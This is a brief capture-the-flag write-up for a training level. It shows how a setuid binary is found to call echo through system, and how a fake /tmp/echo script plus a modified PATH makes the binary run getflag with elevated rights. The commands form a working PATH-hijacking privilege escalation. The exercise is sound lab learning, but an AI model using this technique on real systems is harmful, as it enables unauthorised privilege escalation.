```sh
$: ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

**binary with flag03 rights**
**we search in the binary to know what it does**

COMMAND USED:   -strings
                -strace
                -strace -f
                -gdb (dissasemble main)

**with all that we see that the binary do a call to system and execve**
**and execute the echo command**
**since the binary have flag03 rights we want it to execute the getflag command**
**to do so we gonna make him execute a false echo command who execute the getflag command**

```sh
$: vi /tmp/echo
```

```sh
#!/bin/bash

getflag
```

```sh
$: PATH=/tmp:$PATH ./level03  *execute binary with /tmp in PATH*
*flag*
```

